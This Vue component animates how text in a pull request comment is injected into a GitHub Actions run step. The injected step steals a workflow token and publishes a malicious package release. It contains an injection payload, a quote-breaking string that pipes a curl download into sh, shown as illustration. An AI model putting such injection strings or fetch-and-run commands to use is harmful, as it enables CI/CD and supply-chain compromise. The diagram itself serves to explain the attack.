<script setup lang="ts">
const TEMPLATE = 'run: echo "${{ github.event.comment.body }}"'
</script>

<template>
  <AnimationScene class="comment-injection" aria-label="A pull request comment is substituted into a workflow's run script, so its text runs as shell. The script's GitHub token dispatches the release workflow, which publishes a malicious release.">
    <div class="injection-row mechanism-row">
      <div class="comment-bubble tone-source"><mdi-comment-text-outline /><div><strong>PR comment</strong><code>LGTM<b class="tone-danger">"; curl x | sh #</b></code></div></div>
      <mdi-arrow-right class="injection-arrow" />
      <div class="script-block tone-build"><strong>Workflow step</strong><code class="script-template" v-text="TEMPLATE" /><code class="script-injected">run: echo "LGTM<b class="tone-danger">"; curl x | sh #</b>"</code><small>GitHub substitutes the text before the shell parses the script.</small></div>
      <code class="flight comment-chip tone-danger">"; curl x | sh #</code>
    </div>
    <div class="injection-row consequence-row">
      <div class="injection-node tone-publish"><mdi-key-variant /><strong>GITHUB_TOKEN</strong><span>Read from the job</span></div>
      <mdi-arrow-right class="injection-arrow" />
      <div class="injection-node tone-publish"><mdi-play-circle-outline /><strong>Release workflow</strong><span>Dispatched by the attacker</span></div>
      <mdi-arrow-right class="injection-arrow" />
      <div class="injection-node release-node tone-danger"><ArtifactParcel /><strong>Malicious release</strong><code>elementary-data 0.23.3</code></div>
      <span class="flight token-chip tone-publish"><mdi-key-variant /></span>
      <span class="flight dispatch-chip tone-publish"><mdi-play-circle-outline /></span>
    </div>
  </AnimationScene>
</template>

<style scoped>
.comment-injection { margin-top: 18px; }
.injection-row { position: relative; display: grid; align-items: center; gap: 14px; }
.mechanism-row { grid-template-columns: auto 44px 1fr; padding-bottom: 16px; border-bottom: 2px solid var(--scene-rule); }
.consequence-row { grid-template-columns: 1fr 44px 1fr 44px 1fr; margin-top: 14px; }
.comment-bubble { display: flex; align-items: center; gap: 14px; }
.comment-bubble > svg { font-size: 46px; }
.comment-bubble strong { display: block; font-size: 21px; margin-bottom: 6px; }
.comment-bubble code, .script-block code, .release-node code { font-size: 16px; padding: 3px 8px; border-radius: 4px; background: var(--scene-paper); white-space: nowrap; }
.comment-bubble code b, .script-injected b { font-weight: 600; }
.script-block { display: flex; flex-direction: column; align-items: flex-start; gap: 6px; }
.script-block strong { font-size: 21px; }
.script-block small { font-size: 15px; color: var(--scene-muted); }
.injection-arrow { font-size: 40px; color: var(--scene-muted); }
.injection-node { display: flex; flex-direction: column; align-items: center; gap: 8px; text-align: center; }
.injection-node > svg { font-size: 46px; }
.injection-node strong { font-size: 21px; }
.injection-node > span { font-size: 16px; color: var(--scene-muted); }
.release-node .artifact-parcel { width: 52px; height: 48px; }
.comment-chip { position: absolute; top: 34px; left: 90px; padding: 3px 8px; border-radius: 4px; background: var(--scene-paper); border: 1px solid currentColor; font-size: 16px; white-space: nowrap; }
.token-chip, .dispatch-chip { position: absolute; top: 4px; font-size: 32px; line-height: 1; }
.token-chip { left: calc(16.7% - 16px); }
.dispatch-chip { left: calc(50% - 16px); }
.motion-active .comment-chip { animation: comment-travels 3s ease-in-out both; }
.motion-active .script-injected { animation: injection-shows 3s both; }
.motion-active .token-chip { animation: token-taken 3s ease-in-out both; }
.motion-active .dispatch-chip { animation: release-dispatched 3s ease-in-out both; }
.motion-active .release-node .artifact-parcel { animation: release-lands 3s ease-out both; }
@keyframes comment-travels { 0%, 4% { left: 90px; opacity: 0; } 8% { opacity: 1; } 30% { left: 36%; opacity: 1; } 34%, 100% { left: 36%; opacity: 0; } }
@keyframes injection-shows { 0%, 30% { opacity: .12; } 36%, 100% { opacity: 1; } }
@keyframes token-taken { 0%, 42% { left: calc(16.7% - 16px); opacity: 0; } 46% { opacity: 1; } 60% { left: calc(50% - 16px); opacity: 1; } 64%, 100% { left: calc(50% - 16px); opacity: 0; } }
@keyframes release-dispatched { 0%, 66% { left: calc(50% - 16px); opacity: 0; } 70% { opacity: 1; } 84% { left: calc(83.3% - 16px); opacity: 1; } 88%, 100% { left: calc(83.3% - 16px); opacity: 0; } }
@keyframes release-lands { 0%, 84% { transform: scale(.85); opacity: .35; } 92%, 100% { transform: none; opacity: 1; } }
</style>
